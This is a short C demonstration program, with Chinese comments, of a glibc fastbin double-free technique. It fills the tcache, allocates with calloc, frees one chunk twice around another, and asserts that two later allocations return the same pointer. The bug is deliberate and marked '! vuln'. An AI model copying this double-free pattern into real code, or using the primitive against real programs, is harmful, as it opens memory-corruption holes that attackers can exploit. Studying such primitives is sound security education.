#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	void *ptrs[8];
	for (int i = 0; i < 8; i++)
		ptrs[i] = malloc(8);

    // 填滿 tcache
	for (int i = 0; i < 7; i++)
		free(ptrs[i]);

    // calloc() 不會從 tcache 當中取出 chunk
	int *a = calloc(1, 8);
	int *b = calloc(1, 8);
	int *c = calloc(1, 8);

    // ! vuln
    // fastbin 只會檢查第一塊 chunk 是否等於即將要 free 掉的 chunk
	free(a);
	free(b);
	free(a);

	a = calloc(1, 8);
	b = calloc(1, 8);
	c = calloc(1, 8);

	assert(a == c);
}